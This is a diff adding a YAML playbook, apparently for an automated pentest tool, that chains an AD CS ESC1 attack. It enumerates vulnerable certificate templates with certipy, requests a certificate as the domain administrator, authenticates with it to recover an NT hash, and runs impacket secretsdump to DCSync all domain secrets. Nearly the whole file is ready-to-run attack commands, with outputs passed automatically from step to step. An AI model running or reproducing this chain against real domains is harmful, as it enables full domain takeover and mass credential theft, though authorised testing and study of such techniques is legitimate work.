@@ -1,0 +1,76 @@
+name: "AD CS Abuse Chain (ESC1-ESC8)"
+description: "Cutting-edge Active Directory Certificate Services attack: enumerate vulnerable templates, request certificates for privilege escalation, then use for DCSync or Golden Ticket."
+category: ad
+attack_vector: "AD CS misconfiguration abuse — ESC1/ESC8 certificate theft"
+variables:
+  target:
+    required: true
+    description: "Target domain controller IP"
+  domain:
+    required: true
+    description: "AD domain (e.g. corp.local)"
+  user:
+    required: true
+    description: "Domain user"
+  password:
+    required: true
+    description: "Password"
+  ca_name:
+    required: false
+    description: "CA name (e.g. corp-CA)"
+cutting_edge: true
+references: ["Certified Pre-Owned (SpecterOps)", "MITRE ATT&CK T1649", "ESC1-ESC13 research"]
+
+steps:
+  - name: "certipy_find"
+    tool: "certipy_ad"
+    description: "Find vulnerable certificate templates (ESC1-ESC8)"
+    args:
+      command: "find"
+      target: "{{domain}} -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}} -vulnerable"
+    expected_output: "ESC\\d+|vulnerable|Certificates"
+    timeout: 300
+    gate: true
+    retries: 2
+    extracts:
+      - var: "esc_vuln"
+        regex: "ESC(\\d+)"
+
+  - name: "certipy_request"
+    tool: "certipy_ad"
+    description: "Request a certificate for the vulnerable template (ESC1)"
+    args:
+      command: "req"
+      target: "{{domain}} -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}} -ca {{ca_name}} -template ESC1 -upn administrator@{{domain}}"
+    expected_output: "Saved certificate|Certificate has no object SID"
+    timeout: 300
+    gate: false
+    retries: 2
+    extracts:
+      - var: "cert_file"
+        regex: "([\\w\\-\\.]+\\.pem)"
+
+  - name: "certipy_auth"
+    tool: "certipy_ad"
+    description: "Authenticate with the stolen certificate (PKINIT)"
+    args:
+      command: "auth"
+      target: "{{cert_file}} -dc-ip {{target}}"
+    expected_output: "Got TGT|NT hash|hash"
+    timeout: 300
+    gate: false
+    retries: 2
+    extracts:
+      - var: "nt_hash"
+        regex: "[a-fA-F0-9]{32}"
+
+  - name: "secrets_dump"
+    tool: "impacket_tools"
+    description: "DCSync — dump domain secrets with the NT hash (Golden Ticket path)"
+    args:
+      tool: "secretsdump"
+      target: "{{domain}}/administrator@{{target}} -hashes :{{nt_hash}} -just-dc"
+    expected_output: "\\[\\*\\] Dumping|Administrator:\\d+"
+    timeout: 600
+    gate: false
+    retries: 1
